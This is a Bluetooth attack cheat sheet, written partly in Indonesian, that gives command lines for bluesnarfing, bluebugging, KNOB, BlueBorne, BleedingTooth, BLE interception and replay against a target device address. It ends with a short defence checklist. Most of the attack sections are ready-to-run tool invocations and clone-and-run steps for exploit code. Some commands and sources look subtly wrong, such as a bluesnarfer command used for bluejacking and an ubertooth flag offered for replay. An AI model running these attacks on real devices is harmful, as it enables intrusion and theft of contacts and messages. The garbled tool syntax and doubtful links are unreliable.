# Bluetooth Attacks

## Bluetooth Overview

| Versi | Tahun | Kecepatan | Jangkauan | Keamanan |
|-------|-------|-----------|-----------|----------|
| 2.0 + EDR | 2004 | 3 Mbps | 100m | SSP (2007) |
| 4.0 (BLE) | 2010 | 1 Mbps | 50m | LE Secure Connections |
| 5.0 | 2016 | 2 Mbps | 240m | LE Secure Connections |
| 5.3 | 2021 | 2 Mbps | 240m | Enhanced security |

### BLE (Bluetooth Low Energy)
- **Advertising** — Device broadcasting
- **Scanning** — Device listening for advertising
- **Connection** — Pairing & data transfer
- **Range:** 50-240m (theoretical), 10-30m (practical)

---

## Serangan Bluetooth

### 1. Bluejacking
Mengirim pesan tidak diminta ke perangkat Bluetooth.
```bash
# Tool: bluesnarfer
bluesnarfer -i hci0 -b <BD_ADDR>
```

### 2. Bluesnarfing
Membaca data dari perangkat Bluetooth (kontak, SMS, dll).
```bash
# Tool: bluesnarfer
bluesnarfer -r <phonebook_path> -b <BD_ADDR>
```

### 3. Bluebugging
Mengambil alih kontrol perangkat Bluetooth sepenuhnya.
```bash
# Tool: bluebugger
bluebugger -b <BD_ADDR> -c <channel> -i <interface>
```

### 4. KNOB Attack (CVE-2019-9506)
**Key Negotiation of Bluetooth** — Memaksa key 1-byte.
```bash
# PoC: https://github.com/agnwse/knob
git clone https://github.com/agnwse/knob
cd knob
# Inject weakness saat key negotiation
python3 knob.py --interface hci0 --target <BD_ADDR>
```

### 5. BleedingTooth (CVE-2020-12351, CVE-2020-12352, CVE-2020-24490)
Remote code execution di Bluetooth stack Linux.
```bash
# https://github.com/lukeboi/bleedingtooth
git clone https://github.com/lukeboi/bleedingtooth
# CVE-2020-12351 (L2CAP) - RCE
# CVE-2020-12352 (A2MP) - Info leak
# CVE-2020-24490 (HCI) - Heap overflow
```

### 6. BlueBorne (CVE-2017-1000251)
Remote code execution tanpa pairing.
```bash
# Tool: blueborne
git clone https://github.com/ArmisSecurity/blueborne
python3 blueborne.py --interface hci0 --target <BD_ADDR>
```

### 7. BLE MITM
```bash
# Tool: BtleJuice
git clone https://github.com/SecureAuthCorp/BtleJuice
# Intercept BLE communication
btlejuice_proxy -i hci0
btlejuice_core --target <BD_ADDR>
```

### 8. BLE Sniffing
```bash
# Tool: Ubertooth (hardware required)
ubertooth-btle -t <BD_ADDR>

# Tool: BTLE (software)
btlejack -i <channel>

# Tool: GATTacker (Node.js)
npm install gattacker
node gattacker.js
```

### 9. BLE Replay Attack
```bash
# Capture BLE packets
ubertooth-btle -f -c capture.pcap

# Replay
ubertooth-btle -r capture.pcap
```

---

## BLE Tools

| Tool | Fungsi | Hardware |
|------|--------|----------|
| **Ubertooth One** | BLE sniffing, injection | ✅ Dibutuhkan |
| **HackRF** | SDR, BLE sniffing | ✅ |
| **BtleJack** | BLE hijacking | ✅ |
| **GATTacker** | BLE MITM | Software only |
| **Bettercap** | BLE recon & attack | ✅ |
| **Scapy** | BLE packet crafting | Software only |
| **nRF Connect** | BLE debugging | Mobile app |

---

## BLE Scanning & Recon

### Bettercap BLE
```bash
sudo bettercap -eval "ble.recon on; net.show"
```

### hcitool
```bash
# Scan for BLE devices
sudo hcitool lescan

# Scan for classic BT
sudo hcitool scan

# Device info
sudo hcitool info <BD_ADDR>
```

### gatttool (GATT enumeration)
```bash
# Connect to BLE device
gatttool -b <BD_ADDR> --interactive

# Enumerate services
> primary
# Read characteristic
> char-read-hnd <handle>
```

---

## Detection & Defense

### BLE Monitoring
```bash
# Monitor BLE advertisements
ubertooth-btle -A -f

# Detect rogue BLE
bettercap -eval "ble.recon on"
```

### Defense Checklist
- [ ] Disable Bluetooth saat tidak dipakai
- [ ] Mode "Undiscoverable" / "Hidden"
- [ ] Update firmware device
- [ ] Gunakan BLE Secure Connections
- [ ] Verify pairing (numeric comparison)
- [ ] Monitor BLE device inventory
- [ ] Network segmentation (BLE devices di VLAN terpisah)

---

## Referensi

- **KNOB Attack:** https://www.knobattack.com/
- **BleedingTooth:** https://github.com/lukeboi/bleedingtooth
- **BlueBorne:** https://www.armis.com/blueborne/
- **Ubertooth:** https://github.com/greatscottgadgets/ubertooth
- **BtleJack:** https://github.com/virtualabs/btlejack
